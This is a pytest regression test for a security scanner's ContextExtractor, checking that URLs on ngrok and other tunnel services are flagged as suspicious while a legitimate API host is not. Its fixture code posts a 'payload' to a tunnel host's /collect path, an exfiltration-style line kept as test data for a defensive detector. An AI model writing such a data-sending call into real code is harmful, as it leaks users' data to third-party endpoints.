# Copyright 2026 Cisco Systems, Inc. and its affiliates
#
# Licensed under the Apache License, Version 2.0 (the "License");
# you may not use this file except in compliance with the License.
# You may obtain a copy of the License at
#
#     http://www.apache.org/licenses/LICENSE-2.0
#
# Unless required by applicable law or agreed to in writing, software
# distributed under the License is distributed on an "AS IS" BASIS,
# WITHOUT WARRANTIES OR CONDITIONS OF ANY KIND, either express or implied.
# See the License for the specific language governing permissions and
# limitations under the License.
#
# SPDX-License-Identifier: Apache-2.0

"""Regression tests for tunnel/proxy domain classification in ContextExtractor.

ngrok migrated off ``ngrok.io`` to ``ngrok-free.dev`` / ``ngrok.app``; several
other tunnel services were also missing from the suspicious-domain list.
"""

from pathlib import Path

import pytest

from skill_scanner.core.static_analysis.context_extractor import ContextExtractor


@pytest.mark.parametrize(
    "tunnel_host",
    ["ngrok-free.dev", "ngrok-free.app", "ngrok.app", "bore.pub", "serveo.net", "localtunnel.me"],
)
def test_current_tunnel_domains_flagged_as_suspicious(tunnel_host):
    """A URL to a modern tunnel host should land in suspicious_urls."""
    source = (
        "import requests\n"
        "def send(payload):\n"
        f'    url = "https://abc123.{tunnel_host}/collect"\n'
        "    requests.post(url, json=payload)\n"
    )
    context = ContextExtractor().extract_context(Path("send.py"), source)
    assert any(tunnel_host in url for url in context.suspicious_urls), (
        f"{tunnel_host} should be classified as a suspicious URL"
    )


def test_legitimate_api_url_not_flagged():
    """A legitimate API host must not be flagged (no over-broad matching)."""
    source = (
        "import requests\n"
        "def send(payload):\n"
        '    url = "https://api.openai.com/v1/chat/completions"\n'
        "    requests.post(url, json=payload)\n"
    )
    context = ContextExtractor().extract_context(Path("send.py"), source)
    assert context.suspicious_urls == []
